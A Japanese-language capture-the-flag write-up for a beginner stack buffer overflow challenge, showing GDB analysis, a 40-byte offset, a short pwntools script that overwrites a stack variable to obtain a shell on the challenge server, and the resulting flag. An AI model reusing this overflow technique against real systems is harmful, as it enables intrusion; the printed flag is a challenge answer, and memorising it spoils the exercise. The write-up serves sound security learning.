# Writeup

ELFファイルが与えられる。

```
$ file stackoverflow
stackoverflow: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7bd1104c0adbdb1357db265116844c7a1304c4e, not stripped
```

```
$ ./stackoverflow
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
red
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
```

GDBで解析したところ、以下の命令文を満たせばよいことが分かった。

```
cmp    QWORD PTR [rbp-0x8],0x69637466
```

```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x555555554880 (<__libc_csu_init>: push   r15)
RCX: 0x7ffff7ed51e7 (<__GI___libc_write+23>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x7fffffffde40 --> 0x7ffff7fb4fc8 --> 0x0
RDI: 0x5555555549a3 --> 0x6b6e616854007325 ('%s')
RBP: 0x7fffffffde70 --> 0x0
RSP: 0x7fffffffde40 --> 0x7ffff7fb4fc8 --> 0x0
RIP: 0x555555554825 (<main+107>:        call   0x555555554690 <__isoc99_scanf@plt>)
R8 : 0x9b
R9 : 0x7ffff7fe0d50 (endbr64)
R10: 0xf
R11: 0x246
R12: 0x5555555546b0 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffdf60 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554816 <main+92>:    mov    rsi,rax
   0x555555554819 <main+95>:    lea    rdi,[rip+0x183]        # 0x5555555549a3
   0x555555554820 <main+102>:   mov    eax,0x0
=> 0x555555554825 <main+107>:   call   0x555555554690 <__isoc99_scanf@plt>
   0x55555555482a <main+112>:   lea    rdi,[rip+0x175]        # 0x5555555549a6
   0x555555554831 <main+119>:   call   0x555555554660 <puts@plt>
   0x555555554836 <main+124>:   cmp    QWORD PTR [rbp-0x8],0x69637466
   0x55555555483e <main+132>:   jne    0x55555555485f <main+165>
Guessed arguments:
arg[0]: 0x5555555549a3 --> 0x6b6e616854007325 ('%s')
arg[1]: 0x7fffffffde40 --> 0x7ffff7fb4fc8 --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde40 --> 0x7ffff7fb4fc8 --> 0x0
0008| 0x7fffffffde48 --> 0x555555554880 (<__libc_csu_init>:     push   r15)
0016| 0x7fffffffde50 --> 0x0
0024| 0x7fffffffde58 --> 0x5555555546b0 (<_start>:      xor    ebp,ebp)
0032| 0x7fffffffde60 --> 0x7fffffffdf60 --> 0x1
0040| 0x7fffffffde68 --> 0x42424242 ('BBBB')
0048| 0x7fffffffde70 --> 0x0
0056| 0x7fffffffde78 --> 0x7ffff7deb0b3 (<__libc_start_main+243>:       mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000555555554825 in main ()
```

offset は 40 である。

```
gdb-peda$ xi $rbp-0x8
0x7fffffffde68 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
Virtual memory mapping:
Start : 0x00007ffffffde000
End   : 0x00007ffffffff000
Offset: 0x1fe68
Perm  : rw-p
Name  : [stack]
gdb-peda$ patto AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 40
```

以下のコードを実行するとシェルが実行できるようになる。

```py
from pwn import *

io = remote('chal.imaginaryctf.org', '42001')

payload = p32(0x69637466)

io.sendline(b'\x00'*40 + payload)
io.interactive()
```

```bash
$ python3 solver.py
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
$ ls
flag.txt
run
$ cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```

<!-- ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa} -->
